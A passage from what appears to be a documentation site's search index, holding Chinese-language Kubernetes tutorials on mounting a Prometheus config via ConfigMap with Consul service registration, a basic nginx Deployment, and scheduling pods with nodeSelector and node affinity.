evaluation_interval: 15s alerting: alertmanagers: - static_configs: - targets: rule_files: scrape_configs: - job_name: 'prometheus' consul_sd_configs: - server: 'infra-consul-net:8500' services: [] relabel_configs: - source_labels: [__meta_consul_service] regex: .*prometheus.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap - job_name: 'node-exporter' consul_sd_configs: - server: 'infra-consul-net:8500' services: [] relabel_configs: - source_labels: [__meta_consul_service] regex: .*node-exporter.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap - job_name: 'kube-state-metrics' consul_sd_configs: - server: 'infra-consul-net:8500' services: [] relabel_configs: - source_labels: [ __meta_consul_service ] regex: .*kube-state-metrics.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap \u5e94\u7528\u90e8\u7f72\u6587\u4ef6\uff1aprometheus-deployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: infra-prometheus namespace: default labels: app: infra-prometheus version: infra-prometheus-uat-podname spec: replicas: 1 progressDeadlineSeconds: 600 selector: matchLabels: app: infra-prometheus template: metadata: labels: app: infra-prometheus version: infra-prometheus-uat-podname spec: containers: - name: infra-prometheus-uat-podname image: prom/prometheus:latest #\u6302\u8f7d\u4e0b\u9762\u7684configmap volumeMounts: - mountPath: /etc/prometheus/prometheus.yml subPath: prometheus.yml name: appconfs #\u8bbe\u7f6eIP\uff0cPOD_Name\u53d8\u91cf env: - name: MY_POD_NAME valueFrom: fieldRef: fieldPath: metadata.name - name: MY_POD_IP valueFrom: fieldRef: fieldPath: status.podIP - name: ENV value: UAT ports: - name: requestshttp containerPort: 9090 protocol: TCP - name: curl image: curlimages/curl:latest env: - name: MY_POD_NAME valueFrom: fieldRef: fieldPath: metadata.name - name: MY_POD_IP valueFrom: fieldRef: fieldPath: status.podIP - name: ENV value: UAT #\u8be5\u547d\u4ee4\u8ba9\u5bb9\u5668\u6c38\u4e45\u8fd0\u884c command: [ '/bin/sh','-c' ] args: ['while true;do sleep 1s;done'] lifecycle: postStart: exec: command: [ '/bin/sh','-c','curl -X PUT -d \"{\\\"id\\\": \\\"prometheus-$MY_POD_IP\\\",\\\"name\\\": \\\"prometheus\\\",\\\"address\\\":\\\"$MY_POD_IP\\\",\\\"port\\\": 9090,\\\"tags\\\": [\\\"prometheus\\\"],\\\"checks\\\": [{\\\"http\\\": \\\"http://$MY_POD_IP:9090/metrics\\\", \\\"interval\\\": \\\"15s\\\"}]}\" http://infra-consul-net:8500/v1/agent/service/register && echo \"{\\\"id\\\": \\\"prometheus-$MY_POD_IP\\\",\\\"name\\\": \\\"prometheus\\\",\\\"address\\\":\\\"$MY_POD_IP\\\",\\\"port\\\": 9090,\\\"tags\\\": [\\\"prometheus\\\"],\\\"checks\\\": [{\\\"http\\\": \\\"http://$MY_POD_IP:9090/metrics\\\", \\\"interval\\\": \\\"15s\\\"}]}\" > /tmp/curl.txt' ] preStop: exec: command: [ '/bin/sh','-c','curl -X PUT http://infra-consul-net:8500/v1/agent/service/deregister/prometheus-$MY_POD_IP' ] #\u58f0\u660econfigmap\u7684\u90e8\u5206\u952e\u503c volumes: - name: appconfs configMap: name: infra-prometheus-yml items: - key: prometheus.yml path: prometheus.yml configMap\u5377\u63d2\u4ef6\u4e2d\u7684items\u5b57\u6bb5\u7684\u503c\u662f\u4e00\u4e2a\u5bf9\u8c61\u5217\u8868\uff0c\u53ef\u5d4c\u5957\u4f7f\u75283\u4e2a\u5b57\u6bb5\u6765\u7ec4\u5408\u6307\u5b9a\u8981\u5f15\u7528\u7684\u7279\u5b9a\u952e\u3002 \u25aakey \uff1a\u8981\u5f15\u7528\u7684\u952e\u540d\u79f0\uff0c\u5fc5\u9009\u5b57\u6bb5\u3002 \u25aapath \uff1a\u5bf9\u5e94\u7684\u952e\u5728\u6302\u8f7d\u70b9\u76ee\u5f55\u4e2d\u6620\u5c04\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5b83\u53ef\u4e0d\u540c\u4e8e\u952e\u540d\u79f0\uff0c\u5fc5\u9009\u5b57\u6bb5\u3002 \u25aamode \uff1a\u6587\u4ef6\u7684\u6743\u9650\u6a21\u578b\uff0c\u53ef\u7528\u8303\u56f4\u4e3a0\uff5e0777\u3002 https://www.jianshu.com/p/762c8ccdb092","title":"Depleyment\u6302\u8f7d\u914d\u7f6e\u6587\u4ef6"},{"location":"lxc/kubernetes/depolyment_model/","text":"1.\u90e8\u7f72\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f Kubernetes \u90e8\u7f72 \u5728 k8s \u4e0a\u8fdb\u884c\u90e8\u7f72\u524d\uff0c\u9996\u5148\u9700\u8981\u4e86\u89e3\u4e00\u4e2a\u57fa\u672c\u6982\u5ff5 Deployment Deployment \u8bd1\u540d\u4e3a \u90e8\u7f72 \u3002\u5728k8s\u4e2d\uff0c\u901a\u8fc7\u53d1\u5e03 Deployment\uff0c\u53ef\u4ee5\u521b\u5efa\u5e94\u7528\u7a0b\u5e8f (docker image) \u7684\u5b9e\u4f8b (docker container)\uff0c\u8fd9\u4e2a\u5b9e\u4f8b\u4f1a\u88ab\u5305\u542b\u5728\u79f0\u4e3a Pod \u7684\u6982\u5ff5\u4e2d\uff0c Pod \u662f k8s \u4e2d\u6700\u5c0f\u53ef\u7ba1\u7406\u5355\u5143\u3002 \u5728 k8s \u96c6\u7fa4\u4e2d\u53d1\u5e03 Deployment \u540e\uff0cDeployment \u5c06\u6307\u793a k8s \u5982\u4f55\u521b\u5efa\u548c\u66f4\u65b0\u5e94\u7528\u7a0b\u5e8f\u7684\u5b9e\u4f8b\uff0cmaster \u8282\u70b9\u5c06\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b\u8c03\u5ea6\u5230\u96c6\u7fa4\u4e2d\u7684\u5177\u4f53\u7684\u8282\u70b9\u4e0a\u3002 \u521b\u5efa\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b\u540e\uff0cKubernetes Deployment Controller \u4f1a\u6301\u7eed\u76d1\u63a7\u8fd9\u4e9b\u5b9e\u4f8b\u3002\u5982\u679c\u8fd0\u884c\u5b9e\u4f8b\u7684 worker \u8282\u70b9\u5173\u673a\u6216\u88ab\u5220\u9664\uff0c\u5219 Kubernetes Deployment Controller \u5c06\u5728\u7fa4\u96c6\u4e2d\u8d44\u6e90\u6700\u4f18\u7684\u53e6\u4e00\u4e2a worker \u8282\u70b9\u4e0a\u91cd\u65b0\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b9e\u4f8b\u3002 \u8fd9\u63d0\u4f9b\u4e86\u4e00\u79cd\u81ea\u6211\u4fee\u590d\u673a\u5236\u6765\u89e3\u51b3\u673a\u5668\u6545\u969c\u6216\u7ef4\u62a4\u95ee\u9898\u3002 \u5728\u5bb9\u5668\u7f16\u6392\u4e4b\u524d\u7684\u65f6\u4ee3\uff0c\u5404\u79cd\u5b89\u88c5\u811a\u672c\u901a\u5e38\u7528\u4e8e\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f46\u662f\u4e0d\u80fd\u591f\u4f7f\u5e94\u7528\u7a0b\u5e8f\u4ece\u673a\u5668\u6545\u969c\u4e2d\u6062\u590d\u3002\u901a\u8fc7\u521b\u5efa\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b\u5e76\u786e\u4fdd\u5b83\u4eec\u5728\u96c6\u7fa4\u8282\u70b9\u4e2d\u7684\u8fd0\u884c\u5b9e\u4f8b\u4e2a\u6570\uff0cKubernetes Deployment \u63d0\u4f9b\u4e86\u4e00\u79cd\u5b8c\u5168\u4e0d\u540c\u7684\u65b9\u5f0f\u6765\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\u3002 \u5728 Kubernetes \u4e0a\u90e8\u7f72\u7b2c\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f Deployment \u5904\u4e8e master \u8282\u70b9\u4e0a\uff0c\u901a\u8fc7\u53d1\u5e03 Deployment\uff0cmaster \u8282\u70b9\u4f1a\u9009\u62e9\u5408\u9002\u7684 worker \u8282\u70b9\u521b\u5efa Container\uff08\u5373\u56fe\u4e2d\u7684\u6b63\u65b9\u4f53\uff09\uff0cContainer \u4f1a\u88ab\u5305\u542b\u5728 Pod \uff08\u5373\u84dd\u8272\u5706\u5708\uff09\u91cc\u3002 \u90e8\u7f72 nginx Deployment \u4f7f\u7528 kubectl \u521b\u5efa YAML \u6587\u4ef6 \u521b\u5efa\u6587\u4ef6 nginx-deployment.yaml\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a apiVersion: apps/v1 #\u4e0ek8s\u96c6\u7fa4\u7248\u672c\u6709\u5173\uff0c\u4f7f\u7528 kubectl api-versions \u5373\u53ef\u67e5\u770b\u5f53\u524d\u96c6\u7fa4\u652f\u6301\u7684\u7248\u672c kind: Deployment #\u8be5\u914d\u7f6e\u7684\u7c7b\u578b\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u662f Deployment metadata: #\u8bd1\u540d\u4e3a\u5143\u6570\u636e\uff0c\u5373 Deployment \u7684\u4e00\u4e9b\u57fa\u672c\u5c5e\u6027\u548c\u4fe1\u606f name: nginx-deployment #Deployment \u7684\u540d\u79f0 labels: #\u6807\u7b7e\uff0c\u53ef\u4ee5\u7075\u6d3b\u5b9a\u4f4d\u4e00\u4e2a\u6216\u591a\u4e2a\u8d44\u6e90\uff0c\u5176\u4e2dkey\u548cvalue\u5747\u53ef\u81ea\u5b9a\u4e49\uff0c\u53ef\u4ee5\u5b9a\u4e49\u591a\u7ec4\uff0c\u76ee\u524d\u4e0d\u9700\u8981\u7406\u89e3 app: nginx #\u4e3a\u8be5Deployment\u8bbe\u7f6ekey\u4e3aapp\uff0cvalue\u4e3anginx\u7684\u6807\u7b7e spec: #\u8fd9\u662f\u5173\u4e8e\u8be5Deployment\u7684\u63cf\u8ff0\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4f60\u671f\u5f85\u8be5Deployment\u5728k8s\u4e2d\u5982\u4f55\u4f7f\u7528 replicas: 1 #\u4f7f\u7528\u8be5Deployment\u521b\u5efa\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b selector: #\u6807\u7b7e\u9009\u62e9\u5668\uff0c\u4e0e\u4e0a\u9762\u7684\u6807\u7b7e\u5171\u540c\u4f5c\u7528\uff0c\u76ee\u524d\u4e0d\u9700\u8981\u7406\u89e3 matchLabels: #\u9009\u62e9\u5305\u542b\u6807\u7b7eapp:nginx\u7684\u8d44\u6e90 app: nginx template: #\u8fd9\u662f\u9009\u62e9\u6216\u521b\u5efa\u7684Pod\u7684\u6a21\u677f metadata: #Pod\u7684\u5143\u6570\u636e labels: #Pod\u7684\u6807\u7b7e\uff0c\u4e0a\u9762\u7684selector\u5373\u9009\u62e9\u5305\u542b\u6807\u7b7eapp:nginx\u7684Pod app: nginx spec: #\u671f\u671bPod\u5b9e\u73b0\u7684\u529f\u80fd\uff08\u5373\u5728pod\u4e2d\u90e8\u7f72\uff09 containers: #\u751f\u6210container\uff0c\u4e0edocker\u4e2d\u7684container\u662f\u540c\u4e00\u79cd - name: nginx #container\u7684\u540d\u79f0 image: nginx:1.7.9 #\u4f7f\u7528\u955c\u50cfnginx:1.7.9\u521b\u5efacontainer\uff0c\u8be5container\u9ed8\u8ba480\u7aef\u53e3\u53ef\u8bbf\u95ee \u5e94\u7528 YAML \u6587\u4ef6 kubectl apply -f nginx-deployment.yaml \u67e5\u770b\u90e8\u7f72\u7ed3\u679c # \u67e5\u770b Deployment kubectl get deployments # \u67e5\u770b Pod kubectl get pods \u53ef\u5206\u522b\u67e5\u770b\u5230\u4e00\u4e2a\u540d\u4e3a nginx-deployment \u7684 Deployment \u548c\u4e00\u4e2a\u540d\u4e3a nginx-deployment-xxxxxxx \u7684 Pod","title":"Deployment\u7684demo"},{"location":"lxc/kubernetes/depolyment_model/#1","text":"","title":"1.\u90e8\u7f72\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f"},{"location":"lxc/kubernetes/depolyment_model/#kubernetes","text":"\u5728 k8s \u4e0a\u8fdb\u884c\u90e8\u7f72\u524d\uff0c\u9996\u5148\u9700\u8981\u4e86\u89e3\u4e00\u4e2a\u57fa\u672c\u6982\u5ff5 Deployment Deployment \u8bd1\u540d\u4e3a \u90e8\u7f72 \u3002\u5728k8s\u4e2d\uff0c\u901a\u8fc7\u53d1\u5e03 Deployment\uff0c\u53ef\u4ee5\u521b\u5efa\u5e94\u7528\u7a0b\u5e8f (docker image) \u7684\u5b9e\u4f8b (docker container)\uff0c\u8fd9\u4e2a\u5b9e\u4f8b\u4f1a\u88ab\u5305\u542b\u5728\u79f0\u4e3a Pod \u7684\u6982\u5ff5\u4e2d\uff0c Pod \u662f k8s \u4e2d\u6700\u5c0f\u53ef\u7ba1\u7406\u5355\u5143\u3002 \u5728 k8s \u96c6\u7fa4\u4e2d\u53d1\u5e03 Deployment \u540e\uff0cDeployment \u5c06\u6307\u793a k8s \u5982\u4f55\u521b\u5efa\u548c\u66f4\u65b0\u5e94\u7528\u7a0b\u5e8f\u7684\u5b9e\u4f8b\uff0cmaster \u8282\u70b9\u5c06\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b\u8c03\u5ea6\u5230\u96c6\u7fa4\u4e2d\u7684\u5177\u4f53\u7684\u8282\u70b9\u4e0a\u3002 \u521b\u5efa\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b\u540e\uff0cKubernetes Deployment Controller \u4f1a\u6301\u7eed\u76d1\u63a7\u8fd9\u4e9b\u5b9e\u4f8b\u3002\u5982\u679c\u8fd0\u884c\u5b9e\u4f8b\u7684 worker \u8282\u70b9\u5173\u673a\u6216\u88ab\u5220\u9664\uff0c\u5219 Kubernetes Deployment Controller \u5c06\u5728\u7fa4\u96c6\u4e2d\u8d44\u6e90\u6700\u4f18\u7684\u53e6\u4e00\u4e2a worker \u8282\u70b9\u4e0a\u91cd\u65b0\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b9e\u4f8b\u3002 \u8fd9\u63d0\u4f9b\u4e86\u4e00\u79cd\u81ea\u6211\u4fee\u590d\u673a\u5236\u6765\u89e3\u51b3\u673a\u5668\u6545\u969c\u6216\u7ef4\u62a4\u95ee\u9898\u3002 \u5728\u5bb9\u5668\u7f16\u6392\u4e4b\u524d\u7684\u65f6\u4ee3\uff0c\u5404\u79cd\u5b89\u88c5\u811a\u672c\u901a\u5e38\u7528\u4e8e\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f46\u662f\u4e0d\u80fd\u591f\u4f7f\u5e94\u7528\u7a0b\u5e8f\u4ece\u673a\u5668\u6545\u969c\u4e2d\u6062\u590d\u3002\u901a\u8fc7\u521b\u5efa\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b\u5e76\u786e\u4fdd\u5b83\u4eec\u5728\u96c6\u7fa4\u8282\u70b9\u4e2d\u7684\u8fd0\u884c\u5b9e\u4f8b\u4e2a\u6570\uff0cKubernetes Deployment \u63d0\u4f9b\u4e86\u4e00\u79cd\u5b8c\u5168\u4e0d\u540c\u7684\u65b9\u5f0f\u6765\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\u3002 \u5728 Kubernetes \u4e0a\u90e8\u7f72\u7b2c\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f Deployment \u5904\u4e8e master \u8282\u70b9\u4e0a\uff0c\u901a\u8fc7\u53d1\u5e03 Deployment\uff0cmaster \u8282\u70b9\u4f1a\u9009\u62e9\u5408\u9002\u7684 worker \u8282\u70b9\u521b\u5efa Container\uff08\u5373\u56fe\u4e2d\u7684\u6b63\u65b9\u4f53\uff09\uff0cContainer \u4f1a\u88ab\u5305\u542b\u5728 Pod \uff08\u5373\u84dd\u8272\u5706\u5708\uff09\u91cc\u3002","title":"Kubernetes \u90e8\u7f72"},{"location":"lxc/kubernetes/depolyment_model/#nginx-deployment","text":"\u4f7f\u7528 kubectl \u521b\u5efa YAML \u6587\u4ef6 \u521b\u5efa\u6587\u4ef6 nginx-deployment.yaml\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a apiVersion: apps/v1 #\u4e0ek8s\u96c6\u7fa4\u7248\u672c\u6709\u5173\uff0c\u4f7f\u7528 kubectl api-versions \u5373\u53ef\u67e5\u770b\u5f53\u524d\u96c6\u7fa4\u652f\u6301\u7684\u7248\u672c kind: Deployment #\u8be5\u914d\u7f6e\u7684\u7c7b\u578b\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u662f Deployment metadata: #\u8bd1\u540d\u4e3a\u5143\u6570\u636e\uff0c\u5373 Deployment \u7684\u4e00\u4e9b\u57fa\u672c\u5c5e\u6027\u548c\u4fe1\u606f name: nginx-deployment #Deployment \u7684\u540d\u79f0 labels: #\u6807\u7b7e\uff0c\u53ef\u4ee5\u7075\u6d3b\u5b9a\u4f4d\u4e00\u4e2a\u6216\u591a\u4e2a\u8d44\u6e90\uff0c\u5176\u4e2dkey\u548cvalue\u5747\u53ef\u81ea\u5b9a\u4e49\uff0c\u53ef\u4ee5\u5b9a\u4e49\u591a\u7ec4\uff0c\u76ee\u524d\u4e0d\u9700\u8981\u7406\u89e3 app: nginx #\u4e3a\u8be5Deployment\u8bbe\u7f6ekey\u4e3aapp\uff0cvalue\u4e3anginx\u7684\u6807\u7b7e spec: #\u8fd9\u662f\u5173\u4e8e\u8be5Deployment\u7684\u63cf\u8ff0\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4f60\u671f\u5f85\u8be5Deployment\u5728k8s\u4e2d\u5982\u4f55\u4f7f\u7528 replicas: 1 #\u4f7f\u7528\u8be5Deployment\u521b\u5efa\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b selector: #\u6807\u7b7e\u9009\u62e9\u5668\uff0c\u4e0e\u4e0a\u9762\u7684\u6807\u7b7e\u5171\u540c\u4f5c\u7528\uff0c\u76ee\u524d\u4e0d\u9700\u8981\u7406\u89e3 matchLabels: #\u9009\u62e9\u5305\u542b\u6807\u7b7eapp:nginx\u7684\u8d44\u6e90 app: nginx template: #\u8fd9\u662f\u9009\u62e9\u6216\u521b\u5efa\u7684Pod\u7684\u6a21\u677f metadata: #Pod\u7684\u5143\u6570\u636e labels: #Pod\u7684\u6807\u7b7e\uff0c\u4e0a\u9762\u7684selector\u5373\u9009\u62e9\u5305\u542b\u6807\u7b7eapp:nginx\u7684Pod app: nginx spec: #\u671f\u671bPod\u5b9e\u73b0\u7684\u529f\u80fd\uff08\u5373\u5728pod\u4e2d\u90e8\u7f72\uff09 containers: #\u751f\u6210container\uff0c\u4e0edocker\u4e2d\u7684container\u662f\u540c\u4e00\u79cd - name: nginx #container\u7684\u540d\u79f0 image: nginx:1.7.9 #\u4f7f\u7528\u955c\u50cfnginx:1.7.9\u521b\u5efacontainer\uff0c\u8be5container\u9ed8\u8ba480\u7aef\u53e3\u53ef\u8bbf\u95ee \u5e94\u7528 YAML \u6587\u4ef6 kubectl apply -f nginx-deployment.yaml \u67e5\u770b\u90e8\u7f72\u7ed3\u679c # \u67e5\u770b Deployment kubectl get deployments # \u67e5\u770b Pod kubectl get pods \u53ef\u5206\u522b\u67e5\u770b\u5230\u4e00\u4e2a\u540d\u4e3a nginx-deployment \u7684 Deployment \u548c\u4e00\u4e2a\u540d\u4e3a nginx-deployment-xxxxxxx \u7684 Pod","title":"\u90e8\u7f72 nginx Deployment"},{"location":"lxc/kubernetes/dispatch/","text":"nodeSelector \u6211\u4eec\u77e5\u9053 label \u662f kubernetes \u4e2d\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u6982\u5ff5\uff0c\u7528\u6237\u53ef\u4ee5\u975e\u5e38\u7075\u6d3b\u7684\u5229\u7528 label \u6765\u7ba1\u7406\u96c6\u7fa4\u4e2d\u7684\u8d44\u6e90\uff0c\u6bd4\u5982\u6700\u5e38\u89c1\u7684\u4e00\u4e2a\u5c31\u662f service \u901a\u8fc7\u5339\u914d label \u53bb\u9009\u62e9 POD \u7684\u3002\u800c POD \u7684\u8c03\u5ea6\u4e5f\u53ef\u4ee5\u6839\u636e\u8282\u70b9\u7684 label \u8fdb\u884c\u7279\u5b9a\u7684\u90e8\u7f72\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u67e5\u770b\u6211\u4eec\u7684 node \u7684 label\uff1a $ kubectl get nodes --show-labels NAME STATUS ROLES AGE VERSION LABELS 192.168.1.140 Ready <none> 42d v1.8.1 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/hostname=192.168.1.140 192.168.1.161 Ready <none> 118d v1.8.1 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/cluster-service=true,kubernetes.io/hostname=192.168.1.161 192.168.1.170 Ready <none> 118d v1.8.1 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/cluster-service=true,kubernetes.io/hostname=192.168.1.170 192.168.1.172 Ready <none> 114d v1.8.1 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/cluster-service=true,kubernetes.io/hostname=192.168.1.172 \u73b0\u5728\u6211\u4eec\u5148\u7ed9\u8282\u70b9 192.168.1.140 \u589e\u52a0\u4e00\u4e2a source=qikqiak \u7684\u6807\u7b7e\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a $ kubectl label nodes 192.168.1.140 source=qikqiak node \"192.168.1.140\" labeled \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684 --show-labels \u53c2\u6570\u53ef\u4ee5\u67e5\u770b\u4e0a\u8ff0\u6807\u7b7e\u662f\u5426\u751f\u6548\u3002\u5f53 node \u88ab\u6253\u4e0a\u4e86\u76f8\u5173\u6807\u7b7e\u540e\uff0c\u5728\u8c03\u5ea6\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u6807\u7b7e\u4e86\uff0c\u53ea\u9700\u8981\u5728 POD \u7684 spec \u5b57\u6bb5\u4e2d\u6dfb\u52a0 nodeSelector \u5b57\u6bb5\uff0c\u91cc\u9762\u662f\u6211\u4eec\u9700\u8981\u88ab\u8c03\u5ea6\u7684\u8282\u70b9\u7684 label\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u662f\u6211\u4eec\u4e4b\u524d\u7684\u4e00\u4e2a\u9ed8\u8ba4\u7684 busybox POD \u7684 YAML \u6587\u4ef6\uff1a apiVersion: v1 kind: Pod metadata: labels: app: busybox-pod name: test-busybox spec: containers: - command: - sleep - \"3600\" image: busybox imagePullPolicy: Always name: test-busybox \u7136\u540e\u6211\u9700\u8981\u8ba9\u4e0a\u9762\u7684 POD \u88ab\u8c03\u5ea6\u5230140\u7684\u8282\u70b9\u4e0a\uff0c\u90a3\u4e48\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u53bb\u5339\u914d140\u4e0a\u9762\u7684 label\uff0c\u5982\u4e0b\uff1a apiVersion: v1 kind: Pod metadata: labels: app: busybox-pod name: test-busybox spec: containers: - command: - sleep - \"3600\" image: busybox imagePullPolicy: Always name: test-busybox nodeSelector: source: qikqiak \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 describe \u547d\u4ee4\u67e5\u770b\u8c03\u5ea6\u7ed3\u679c\uff1a $ kubectl describe pod test-busybox ...... Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 49s default-scheduler Successfully assigned test-busybox to 192.168.1.140 Normal SuccessfulMountVolume 49s kubelet, 192.168.1.140 MountVolume.SetUp succeeded for volume \"default-token-hmpbz\" Normal Pulling 49s kubelet, 192.168.1.140 pulling image \"busybox\" Normal Pulled 41s kubelet, 192.168.1.140 Successfully pulled image \"busybox\" Normal Created 41s kubelet, 192.168.1.140 Created container Normal Started 41s kubelet, 192.168.1.140 Started container \u6211\u4eec\u53ef\u4ee5\u770b\u5230 Events \u4e0b\u9762\u7684\u4fe1\u606f\uff0c\u4e0a\u9762\u7684 POD \u88ab\u6b63\u786e\u7684\u8c03\u5ea6\u5230\u4e86140\u8282\u70b9\u3002\u901a\u8fc7\u4e0a\u9762\u7684\u4f8b\u5b50\u6211\u4eec\u53ef\u4ee5\u611f\u53d7\u5230 nodeSelector \u7684\u65b9\u5f0f\u6bd4\u8f83\u76f4\u89c2\uff0c\u4f46\u662f\u8fd8\u591f\u7075\u6d3b\uff0c\u63a7\u5236\u7c92\u5ea6\u504f\u5927 node affinity \u8282\u70b9\u4eb2\u548c\u6027\uff08node affinity\uff09\u7684\u6982\u5ff5\u4e0e nodeSelector \u76f8\u4f3c\uff0c\u53ef\u4ee5\u57fa\u4e8e\u8282\u70b9\u7684\u6807\u7b7e\u6765\u9650\u5b9a Pod \u53ef\u4ee5\u88ab\u8c03\u5ea6\u5230\u54ea\u4e9b\u8282\u70b9\u4e0a\u3002 \u5f53\u524d\u652f\u6301\u4e24\u79cd\u7c7b\u578b\u7684\u8282\u70b9\u4eb2\u548c\u6027\uff0c requiredDuringSchedulingIgnoredDuringExecution \uff08hard\uff0c\u76ee\u6807\u8282\u70b9\u5fc5\u987b\u6ee1\u8db3\u6b64\u6761\u4ef6\uff09 \u4ee5\u53ca preferredDuringSchedulingIgnoredDuringExecution \uff08soft\uff0c\u76ee\u6807\u8282\u70b9\u6700\u597d\u80fd\u6ee1\u8db3\u6b64\u6761\u4ef6\uff09\u3002\u540d\u5b57\u4e2d IgnoredDuringExecution \u610f\u5473\u7740\uff1a\u5982\u679c Pod \u5df2\u7ecf\u8c03\u5ea6\u5230\u8282\u70b9\u4e0a\u4ee5\u540e\uff0c\u8282\u70b9\u7684\u6807\u7b7e\u53d1\u751f\u6539\u53d8\uff0c\u4f7f\u5f97\u8282\u70b9\u5df2\u7ecf\u4e0d\u518d\u5339\u914d\u8be5\u4eb2\u548c\u6027\u89c4\u5219\u4e86\uff0cPod \u4ecd\u5c06\u7ee7\u7eed\u5728\u8282\u70b9\u4e0a\u6267\u884c\uff08\u8fd9\u4e00\u70b9\u4e0e nodeSelector \u76f8\u4f3c\uff09\u3002\u5c06\u6765\uff0cKubernetes \u5c06\u4f1a\u63d0\u4f9b requiredDuringSchedulingRequiredDuringExecution \u8fd9\u4e2a\u9009\u9879\uff0c\u8be5\u9009\u9879\u4e0e requiredDuringSchedulingIgnoredDuringExecution \u76f8\u4f3c\uff0c\u4e0d\u540c\u7684\u662f\uff0c\u5f53\u8282\u70b9\u7684\u6807\u7b7e\u4e0d\u5728\u5339\u914d\u4eb2\u548c\u6027\u89c4\u5219\u4e4b\u540e\uff0cPod \u5c06\u88ab\u4ece\u8282\u70b9\u4e0a\u9a71\u9010\u3002 requiredDuringSchedulingIgnoredDuringExecution \u7684\u4e00\u4e2a\u4f8b\u5b50\u662f\uff0c \u53ea\u5728 Intel CPU \u4e0a\u8fd0\u884c\u8be5 Pod \uff0c preferredDuringSchedulingIgnoredDuringExecution \u7684\u4e00\u4e2a\u4f8b\u5b50\u662f\uff0c \u5c3d\u91cf\u5728\u9ad8\u53ef\u7528\u533a XYZ \u4e2d\u8fd0\u884c\u8fd9\u4e2a Pod\uff0c\u4f46\u662f\u5982\u679c\u505a\u4e0d\u5230\uff0c\u4e5f\u53ef\u4ee5\u5728\u5176\u4ed6\u5730\u65b9\u8fd0\u884c\u8be5 Pod \u3002 PodSpec \u4e2d\u901a\u8fc7 affinity.nodeAffinity \u5b57\u6bb5\u6765\u5b9a\u4e49\u8282\u70b9\u4eb2\u548c\u6027\uff0c\u793a\u4f8b\u6587\u4ef6\u5982\u4e0b\uff1a apiVersion: v1 kind: Pod metadata: name: with-node-affinity spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/e2e-az-name operator: In values: - e2e-az1 - e2e-az2 preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 preference: matchExpressions: - key: another-node-label-key operator: In values: - another-node-label-value containers: - name: with-node-affinity image: k8s.gcr.io/pause:2.0 \u6b64\u5904\u7684\u4eb2\u548c\u6027\u89c4\u5219\u8868\u660e\uff0c\u8be5 Pod \u53ea\u80fd\u88ab\u8c03\u5ea6\u5230\u5305\u542b key \u4e3a kubernetes.io/e2e-az-name \u4e14 value \u4e3a e2e-az1 \u6216 e2e-az2 \u7684\u6807\u7b7e\u7684\u8282\u70b9\u4e0a\u3002\u6b64\u5916\uff0c\u5982\u679c\u8282\u70b9\u5df2\u7ecf\u6ee1\u8db3\u4e86\u524d\u8ff0\u6761\u4ef6\uff0c\u5c06\u4f18\u5148\u9009\u62e9\u5305\u542b key \u4e3a another-node-label-key \u4e14 value \u4e3a another-node-label-value \u7684\u6807\u7b7e\u7684\u8282\u70b9\u3002 \u4f8b\u5b50\u4e2d\u4f7f\u7528\u4e86\u64cd\u4f5c\u7b26 In \u3002\u8282\u70b9\u4eb2\u548c\u6027\u652f\u6301\u5982\u4e0b\u64cd\u4f5c\u7b26\uff1a In \u3001 NotIn \u3001 Exists \u3001 DoesNotExist \u3001 Gt \u3001 Lt \u3002\u4f7f\u7528 NotIn \u548c DoesNotExist \u53ef\u4ee5\u5b9e\u73b0\u8282\u70b9\u53cd\u4eb2\u548c\u6027\uff08node anti-affinity\uff09\u7684\u6548\u679c\uff0c\u6216\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528 \u6c61\u70b9 \u4e3a\u8282\u70b9\u6392\u65a5\u67d0\u7c7b Pod\u3002 In\uff1alabel \u7684\u503c\u5728\u67d0\u4e2a\u5217\u8868\u4e2d 